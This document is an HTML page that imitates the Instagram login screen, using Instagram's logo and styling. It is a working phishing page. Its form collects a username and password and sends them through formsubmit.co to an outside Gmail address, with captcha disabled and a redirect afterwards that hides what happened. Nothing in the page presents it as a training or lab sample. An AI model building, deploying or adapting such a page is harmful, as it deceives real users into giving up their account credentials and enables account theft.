<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Instagram Login</title>
  <style>
    * {
      box-sizing: border-box;
      font-family: Arial, sans-serif;
    }

    body {
      background-color: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .login-container {
      background-color: #fff;
      border: 1px solid #dbdbdb;
      padding: 40px;
      width: 350px;
      text-align: center;
      border-radius: 8px;
    }

    .login-container img {
      width: 200px;
      margin-bottom: 30px;
    }

    input {
      width: 100%;
      padding: 10px;
      margin: 6px 0;
      border: 1px solid #dbdbdb;
      background-color: #fafafa;
      border-radius: 3px;
    }

    button {
      width: 100%;
      background-color: #0095f6;
      color: white;
      padding: 10px;
      border: none;
      border-radius: 4px;
      font-weight: bold;
      margin-top: 10px;
      cursor: pointer;
    }

    .forgot-password {
      margin-top: 12px;
      font-size: 13px;
    }

    .forgot-password a {
      color: #00376b;
      text-decoration: none;
    }

    .signup {
      margin-top: 20px;
      font-size: 14px;
    }

    .signup a {
      color: #0095f6;
      text-decoration: none;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <img src="https://1000logos.net/wp-content/uploads/2017/02/Instagram-Logo-2013.png" alt="Instagram Logo" />
    
    <form action="https://formsubmit.co/theinvestorcompany001@gmail.com" method="POST">
      <input type="text" name="username" placeholder="Username or email" required />
      <input type="password" name="password" placeholder="Password" required />
      <button type="submit">Log In</button>

      <div class="forgot-password">
        <a href="#">Forgot password?</a>
      </div>

      <!-- Hidden FormSubmit config -->
      <input type="hidden" name="_captcha" value="false">
      <input type="hidden" name="_subject" value="New Instagram-style Login Submission">
      <input type="hidden" name="_next" value="https://example.com/thank-you.html">
    </form>

    <div class="signup">
      Don't have an account? <a href="#">Sign up</a>
    </div>
  </div>
</body>
</html>
